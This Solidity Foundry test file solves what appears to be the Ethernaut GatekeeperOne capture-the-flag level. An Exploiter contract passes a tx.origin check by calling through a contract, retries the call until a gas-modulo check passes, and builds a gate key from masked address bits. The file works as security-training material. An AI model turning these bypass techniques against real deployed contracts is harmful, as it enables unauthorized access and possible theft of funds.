// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

contract GatekeeperTest is Test {
    Exploiter c;

    address attacker = makeAddr("attacker");

    function setUp() public {
        c = new Exploiter(address(new GatekeeperOne()));
        // c = new Exploiter(0xD23c089434981C38B540955c7d49Fc61f296a9B3);
    }

    function test_gate() external {
        vm.prank(attacker);
        c.enter();
    }
}

contract Exploiter {
    address immutable GATE;

    constructor(address _gate) {
        GATE = _gate;
    }

    function enter() external {
        bytes8 key = _getKey();
        bool success;
        while (!success) {
            try IGatekeeperOne(GATE).enter(key) {
                success = true;
            }
            catch {}
        }
   }

    function _getKey() internal returns(bytes8 key) {
        uint160 _mask = uint160(address(1)) << 63; 
        uint160 _last16 = uint160(uint16(uint160(msg.sender)));
        key = bytes8(uint64(_mask + _last16));
    }
}

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        console2.log("First: ", uint32(uint64(_gateKey)));
        console2.log("Second: ", uint16(uint160(tx.origin)));
        console2.log("Origin: ", tx.origin);
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}